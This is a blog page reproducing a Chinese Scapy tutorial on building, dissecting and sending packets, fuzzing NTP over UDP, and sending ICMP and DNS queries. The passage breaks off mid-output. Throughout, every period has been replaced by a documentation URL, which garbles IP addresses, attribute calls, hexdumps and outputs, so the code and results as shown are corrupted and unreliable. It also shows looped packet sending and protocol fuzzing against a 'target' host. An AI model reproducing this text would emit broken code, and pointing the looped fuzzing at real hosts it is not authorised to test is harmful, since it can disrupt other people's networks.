<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>Scapy的使用方法 - 编程随想</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="Scapy的使用方法" />
<meta property="og:description" content="Scapy的交互shell是运行在一个终端会话当中。因为需要root权限才能发送数据包，所以我们在这里使用sudo
$ sudo scapy Welcome to Scapy (2https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1-dev) &gt;&gt;&gt; 在Windows当中，请打开命令提示符（cmdhttps://wizardforcel.gitbooks.io/scapy-docs/content/exe），并确保您拥有管理员权限：
C:\&gt;scapy INFO: No IPv6 support in kernel WARNING: No route found for IPv6 destination :: (no default route?) Welcome to Scapy (2https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1-dev) &gt;&gt;&gt; 如果您没有安装所有的可选包，Scapy将会告诉你有些功能不可用：
INFO: Can&#39;t import python gnuplot wrapper https://wizardforcel.gitbooks.io/scapy-docs/content/ Won&#39;t be able to plothttps://wizardforcel.gitbooks.io/scapy-docs/content/ INFO: Can&#39;t import PyXhttps://wizardforcel.gitbooks.io/scapy-docs/content/ Won&#39;t be able to use psdump() or pdfdump()https://wizardforcel.gitbooks.io/scapy-docs/content/ 虽然没有安装，但发送和接收数据包的基本功能仍能有效。
本节将会告诉您一些Scapy的功能。让我们按上文所述打开Scapy，亲自尝试些例子吧。
让我们来建立一个数据包试一试
&gt;&gt;&gt; a=IP(ttl=10) &gt;&gt;&gt; a &lt; IP ttl=10 |&gt; &gt;&gt;&gt; ahttps://wizardforcel." />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/5542d1941fe2735ce82e19ff6cd80b1b/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-05-31T06:59:46+08:00" />
<meta property="article:modified_time" content="2021-05-31T06:59:46+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="编程随想" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">编程随想</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">Scapy的使用方法</h1>
			
		</header>
		<div class="content post__content clearfix">
			
<div id="content_views" class="htmledit_views">
                    <p>Scapy的交互shell是运行在一个终端会话当中。因为需要root权限才能发送数据包，所以我们在这里使用<code>sudo</code></p> 
<pre><code>$ sudo scapy
Welcome to Scapy (2https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1-dev)
&gt;&gt;&gt;</code></pre> 
<p>在Windows当中，请打开命令提示符（<code>cmdhttps://wizardforcel.gitbooks.io/scapy-docs/content/exe</code>），并确保您拥有管理员权限：</p> 
<pre><code>C:\&gt;scapy
INFO: No IPv6 support in kernel
WARNING: No route found for IPv6 destination :: (no default route?)
Welcome to Scapy (2https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1-dev)
&gt;&gt;&gt;</code></pre> 
<p>如果您没有安装所有的可选包，Scapy将会告诉你有些功能不可用：</p> 
<pre><code>INFO: Can't import python gnuplot wrapper https://wizardforcel.gitbooks.io/scapy-docs/content/ Won't be able to plothttps://wizardforcel.gitbooks.io/scapy-docs/content/
INFO: Can't import PyXhttps://wizardforcel.gitbooks.io/scapy-docs/content/ Won't be able to use psdump() or pdfdump()https://wizardforcel.gitbooks.io/scapy-docs/content/</code></pre> 
<p>虽然没有安装，但发送和接收数据包的基本功能仍能有效。</p> 
<p>本节将会告诉您一些Scapy的功能。让我们按上文所述打开Scapy，亲自尝试些例子吧。</p> 
<p>让我们来建立一个数据包试一试</p> 
<pre><code>&gt;&gt;&gt; a=IP(ttl=10)
&gt;&gt;&gt; a
&lt; IP ttl=10 |&gt;
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/src
’127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1’
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1"
&gt;&gt;&gt; a
&lt; IP ttl=10 dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 |&gt;
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/src
’192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/8https://wizardforcel.gitbooks.io/scapy-docs/content/14’
&gt;&gt;&gt; del(ahttps://wizardforcel.gitbooks.io/scapy-docs/content/ttl)
&gt;&gt;&gt; a
&lt; IP dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/1https://wizardforcel.gitbooks.io/scapy-docs/content/1 |&gt;
&gt;&gt;&gt; ahttps://wizardforcel.gitbooks.io/scapy-docs/content/ttl
64</code></pre> 
<p><code>/</code>操作符在两层之间起到一个组合的作用。当使用该操作符时，下层可以根据其上层，使它的一个或多个默认字段被重载。（您仍可以赋予您想要的值）一个字符串也可以被用作原料层（<code>raw layer</code>）。</p> 
<pre><code class="language-html"> </code></pre> 
<ol><li> <pre><code>&gt;&gt;&gt; IP()
&lt;IP |&gt;
&gt;&gt;&gt; IP()/TCP()
&lt;IP frag=0 proto=TCP |&lt;TCP |&gt;&gt;
&gt;&gt;&gt; Ether()/IP()/TCP()
&lt;Ether type=0x800 |&lt;IP frag=0 proto=TCP |&lt;TCP |&gt;&gt;&gt;
&gt;&gt;&gt; IP()/TCP()/"GET / HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0\r\n\r\n"
&lt;IP frag=0 proto=TCP |&lt;TCP |&lt;Raw load='GET / HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0\r\n\r\n' |&gt;&gt;&gt;
&gt;&gt;&gt; Ether()/IP()/IP()/UDP()
&lt;Ether type=0x800 |&lt;IP frag=0 proto=IP |&lt;IP frag=0 proto=UDP |&lt;UDP |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; IP(proto=55)/TCP()
&lt;IP frag=0 proto=55 |&lt;TCP |&gt;&gt;</code></pre> <p> </p> </li></ol> 
<p> </p> 
<p>每一个数据包都可以被建立或分解（注意：在Python中<code>_</code>（下划线）是上一条语句执行的结果）：</p> 
<pre><code>&gt;&gt;&gt; str(IP())
'E\x00\x00\x14\x00\x01\x00\x00@\x00|\xe7\x7f\x00\x00\x01\x7f\x00\x00\x01'
&gt;&gt;&gt; IP(_)
&lt;IP version=4L ihl=5L tos=0x0 len=20 id=1 flags= frag=0L ttl=64 proto=IP
chksum=0x7ce7 src=127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1 dst=127https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/0https://wizardforcel.gitbooks.io/scapy-docs/content/1 |&gt;
&gt;&gt;&gt; a=Ether()/IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org")/TCP()/"GET /indexhttps://wizardforcel.gitbooks.io/scapy-docs/content/html HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0 \n\n"
&gt;&gt;&gt; hexdump(a)
00 02 15 37 A2 44 00 AE F3 52 AA D1 08 00 45 00 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/7https://wizardforcel.gitbooks.io/scapy-docs/content/Dhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Rhttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Ehttps://wizardforcel.gitbooks.io/scapy-docs/content/
00 43 00 01 00 00 40 06 78 3C C0 A8 05 15 42 23 https://wizardforcel.gitbooks.io/scapy-docs/content/Chttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/@https://wizardforcel.gitbooks.io/scapy-docs/content/x&lt;https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/B#
FA 97 00 14 00 50 00 00 00 00 00 00 00 00 50 02 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Phttps://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Phttps://wizardforcel.gitbooks.io/scapy-docs/content/
20 00 BB 39 00 00 47 45 54 20 2F 69 6E 64 65 78 https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/9https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/GET /index
2E 68 74 6D 6C 20 48 54 54 50 2F 31 2E 30 20 0A https://wizardforcel.gitbooks.io/scapy-docs/content/html HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0 https://wizardforcel.gitbooks.io/scapy-docs/content/
0A https://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; b=str(a)
&gt;&gt;&gt; b
'\x00\x02\x157\xa2D\x00\xae\xf3R\xaa\xd1\x08\x00E\x00\x00C\x00\x01\x00\x00@\x06x&lt;\xc0
\xa8\x05\x15B#\xfa\x97\x00\x14\x00P\x00\x00\x00\x00\x00\x00\x00\x00P\x02 \x00
\xbb9\x00\x00GET /indexhttps://wizardforcel.gitbooks.io/scapy-docs/content/html HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0 \n\n'
&gt;&gt;&gt; c=Ether(b)
&gt;&gt;&gt; c
&lt;Ether dst=00:02:15:37:a2:44 src=00:ae:f3:52:aa:d1 type=0x800 |&lt;IP version=4L
ihl=5L tos=0x0 len=67 id=1 flags= frag=0L ttl=64 proto=TCP chksum=0x783c
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 options='' |&lt;TCP sport=20 dport=80 seq=0L
ack=0L dataofs=5L reserved=0L flags=S window=8192 chksum=0xbb39 urgptr=0
options=[] |&lt;Raw load='GET /indexhttps://wizardforcel.gitbooks.io/scapy-docs/content/html HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0 \n\n' |&gt;&gt;&gt;&gt;</code></pre> 
<p>我们看到一个分解的数据包将其所有的字段填充。那是因为我认为，附加有原始字符串的字段都有它自身的价值。如果这太冗长，<code>hide_defaults()</code>方法将会删除具有默认值的字段：</p> 
<pre><code>&gt;&gt;&gt; chttps://wizardforcel.gitbooks.io/scapy-docs/content/hide_defaults()
&gt;&gt;&gt; c
&lt;Ether dst=00:0f:66:56:fa:d2 src=00:ae:f3:52:aa:d1 type=0x800 |&lt;IP ihl=5L len=67
frag=0 proto=TCP chksum=0x783c src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 |&lt;TCP dataofs=5L
chksum=0xbb39 options=[] |&lt;Raw load='GET /indexhttps://wizardforcel.gitbooks.io/scapy-docs/content/html HTTP/1https://wizardforcel.gitbooks.io/scapy-docs/content/0 \n\n' |&gt;&gt;&gt;&gt;</code></pre> 
<p>你可以从PCAP文件中读取数据包，并将其写入到一个PCAP文件中。</p> 
<pre><code>&gt;&gt;&gt; a=rdpcap("/spare/captures/isakmphttps://wizardforcel.gitbooks.io/scapy-docs/content/cap")
&gt;&gt;&gt; a
&lt;isakmphttps://wizardforcel.gitbooks.io/scapy-docs/content/cap: UDP:721 TCP:0 ICMP:0 Other:0&gt;</code></pre> 
<p>如果您已经安装PyX，您可以做一个数据包的图形PostScript/ PDF转储（见下面丑陋的PNG图像，PostScript/PDF则具有更好的质量https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/）</p> 
<pre><code>
&gt;&gt;&gt; a[423]https://wizardforcel.gitbooks.io/scapy-docs/content/pdfdump(layer_shift=1)
&gt;&gt;&gt; a[423]https://wizardforcel.gitbooks.io/scapy-docs/content/psdump("/tmp/isakmp_pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/eps",layer_shift=1)</code></pre> 
<p> </p> 
<table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>str(pkt)</td><td>组装数据包</td></tr><tr><td>hexdump(pkt)</td><td>十六进制转储</td></tr><tr><td>ls(pkt)</td><td>显示出字段值的列表</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/summary()</td><td>一行摘要</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/show()</td><td>针对数据包的展开试图</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/show2()</td><td>显示聚合的数据包（例如，计算好了校验和）</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/sprintf()</td><td>用数据包字段填充格式字符串</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/decode_payload_as()</td><td>改变payload的decode方式</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/psdump()</td><td>绘制一个解释说明的PostScript图表</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/pdfdump()</td><td>绘制一个解释说明的PDF</td></tr><tr><td>pkthttps://wizardforcel.gitbooks.io/scapy-docs/content/command()</td><td>返回可以生成数据包的Scapy命令</td></tr></tbody></table> 
<p>目前我们只是生成一个数据包。让我们看看如何轻易地定制一组数据包。整个数据包的每一个字段（甚至是网络层次）都可以是一组。在这里隐含地定义了一组数据包的概念，意即是使用所有区域之间的笛卡尔乘积来生成的一组数据包。</p> 
<pre><code>&gt;&gt;&gt; a=IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org/30")
&gt;&gt;&gt; a
&lt;IP dst=Net('wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org/30') |&gt;
&gt;&gt;&gt; [p for p in a]
[&lt;IP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/148 |&gt;, &lt;IP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/149 |&gt;,
&lt;IP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 |&gt;, &lt;IP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 |&gt;]
&gt;&gt;&gt; b=IP(ttl=[1,2,(5,9)])
&gt;&gt;&gt; b
&lt;IP ttl=[1, 2, (5, 9)] |&gt;
&gt;&gt;&gt; [p for p in b]
[&lt;IP ttl=1 |&gt;, &lt;IP ttl=2 |&gt;, &lt;IP ttl=5 |&gt;, &lt;IP ttl=6 |&gt;,
&lt;IP ttl=7 |&gt;, &lt;IP ttl=8 |&gt;, &lt;IP ttl=9 |&gt;]
&gt;&gt;&gt; c=TCP(dport=[80,443])
&gt;&gt;&gt; [p for p in a/c]
[&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/148 |&lt;TCP dport=80 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/148 |&lt;TCP dport=443 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/149 |&lt;TCP dport=80 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/149 |&lt;TCP dport=443 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 |&lt;TCP dport=80 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/150 |&lt;TCP dport=443 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 |&lt;TCP dport=80 |&gt;&gt;,
&lt;IP frag=0 proto=TCP dst=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 |&lt;TCP dport=443 |&gt;&gt;]</code></pre> 
<p>某些操作（如修改一个数据包中的字符串）无法对于一组数据包使用。在这些情况下，如果您忘记展开您的数据包集合，只有您忘记生成的列表中的第一个元素会被用于组装数据包。</p> 
<table><thead><tr><th>命令</th><th>效果</th></tr></thead><tbody><tr><td>summary()</td><td>显示一个关于每个数据包的摘要列表</td></tr><tr><td>nsummary()</td><td>同上，但规定了数据包数量</td></tr><tr><td>conversations()</td><td>显示一个会话图表</td></tr><tr><td>show()</td><td>显示首选表示（通常用nsummary()）</td></tr><tr><td>filter()</td><td>返回一个lambda过滤后的数据包列表</td></tr><tr><td>hexdump()</td><td>返回所有数据包的一个hexdump</td></tr><tr><td>hexraw()</td><td>返回所以数据包Raw layer的hexdump</td></tr><tr><td>padding()</td><td>返回一个带填充的数据包的hexdump</td></tr><tr><td>nzpadding()</td><td>返回一个具有非零填充的数据包的hexdump</td></tr><tr><td>plot()</td><td>规划一个应用到数据包列表的lambda函数</td></tr><tr><td>make table()</td><td>根据lambda函数来显示表格</td></tr></tbody></table> 
<p>现在我们知道了如何处理数据包。让我们来看看如何发送它们。<code>send()</code>函数将会在第3层发送数据包。也就是说它会为你处理路由和第2层的数据。<code>sendp()</code>函数将会工作在第2层。选择合适的接口和正确的链路层协议都取决于你。</p> 
<pre><code>&gt;&gt;&gt; send(IP(dst="1https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/4")/ICMP())
https://wizardforcel.gitbooks.io/scapy-docs/content/
Sent 1 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; sendp(Ether()/IP(dst="1https://wizardforcel.gitbooks.io/scapy-docs/content/2https://wizardforcel.gitbooks.io/scapy-docs/content/3https://wizardforcel.gitbooks.io/scapy-docs/content/4",ttl=(1,4)), iface="eth1")
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Sent 4 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; sendp("I'm travelling on Ethernet", iface="eth1", loop=1, inter=0https://wizardforcel.gitbooks.io/scapy-docs/content/2)
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/^C
Sent 16 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
&gt;&gt;&gt; sendp(rdpcap("/tmp/pcapfile")) # tcpreplay
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/
Sent 11 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/</code></pre> 
<p><code>fuzz()</code>函数可以通过一个具有随机值、数据类型合适的对象，来改变任何默认值，但该值不能是被计算的（像校验和那样）。这使得可以快速建立循环模糊化测试模板。在下面的例子中，IP层是正常的，UDP层和NTP层被fuzz。UDP的校验和是正确的，UDP的目的端口被NTP重载为123，而且NTP的版本被更变为4https://wizardforcel.gitbooks.io/scapy-docs/content/其他所有的端口将被随机分组：</p> 
<pre><code>&gt;&gt;&gt; send(IP(dst="target")/fuzz(UDP()/NTP(version=4)),loop=1)
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/^C
Sent 16 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/</code></pre> 
<p>现在让我们做一些有趣的事情。<code>sr()</code>函数是用来发送数据包和接收应答。该函数返回一对数据包及其应答，还有无应答的数据包。<code>sr1()</code>函数是一种变体，用来返回一个应答数据包。发送的数据包必须是第3层报文（IP，ARP等）。<code>srp()</code>则是使用第2层报文（以太网，802https://wizardforcel.gitbooks.io/scapy-docs/content/3等）。</p> 
<pre><code>&gt;&gt;&gt; p=sr1(IP(dst="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org")/ICMP()/"XXXXXXXXXXX")
Begin emission:
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/Finished to send 1 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
https://wizardforcel.gitbooks.io/scapy-docs/content/*
Received 5 packets, got 1 answers, remaining 0 packets
&gt;&gt;&gt; p
&lt;IP version=4L ihl=5L tos=0x0 len=39 id=15489 flags= frag=0L ttl=42 proto=ICMP
chksum=0x51dd src=66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151 dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 options='' |&lt;ICMP type=echo-reply
code=0 chksum=0xee45 id=0x0 seq=0x0 |&lt;Raw load='XXXXXXXXXXX'
|&lt;Padding load='\x00\x00\x00\x00' |&gt;&gt;&gt;&gt;
&gt;&gt;&gt; phttps://wizardforcel.gitbooks.io/scapy-docs/content/show()
---[ IP ]---
version = 4L
ihl = 5L
tos = 0x0
len = 39
id = 15489
flags =
frag = 0L
ttl = 42
proto = ICMP
chksum = 0x51dd
src = 66https://wizardforcel.gitbooks.io/scapy-docs/content/35https://wizardforcel.gitbooks.io/scapy-docs/content/250https://wizardforcel.gitbooks.io/scapy-docs/content/151
dst = 192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21
options = ''
---[ ICMP ]---
type = echo-reply
code = 0
chksum = 0xee45
id = 0x0
seq = 0x0
---[ Raw ]---
load = 'XXXXXXXXXXX'
---[ Padding ]---
load = '\x00\x00\x00\x00'</code></pre> 
<p>DNS查询（<code>rd</code> = recursion desired）。主机192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/1是我的DNS服务器。注意从我Linksys来的非空填充具有Etherleak缺陷：</p> 
<pre><code>&gt;&gt;&gt; sr1(IP(dst="192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/1")/UDP()/DNS(rd=1,qd=DNSQR(qname="wwwhttps://wizardforcel.gitbooks.io/scapy-docs/content/slashdothttps://wizardforcel.gitbooks.io/scapy-docs/content/org")))
Begin emission:
Finished to send 1 packetshttps://wizardforcel.gitbooks.io/scapy-docs/content/
https://wizardforcel.gitbooks.io/scapy-docs/content/https://wizardforcel.gitbooks.io/scapy-docs/content/*
Received 3 packets, got 1 answers, remaining 0 packets
&lt;IP version=4L ihl=5L tos=0x0 len=78 id=0 flags=DF frag=0L ttl=64 proto=UDP chksum=0xaf38
src=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/1 dst=192https://wizardforcel.gitbooks.io/scapy-docs/content/168https://wizardforcel.gitbooks.io/scapy-docs/content/5https://wizardforcel.gitbooks.io/scapy-docs/content/21 options='' |&lt;UDP sport=53 dport=53 len=58 chksum=0xd55d
|&lt;DNS id=0 qr=1L opcode=QUERY aa=0L tc=0L rd=1L ra=1L z=0L rcode=ok qdcount=1 ancount=1
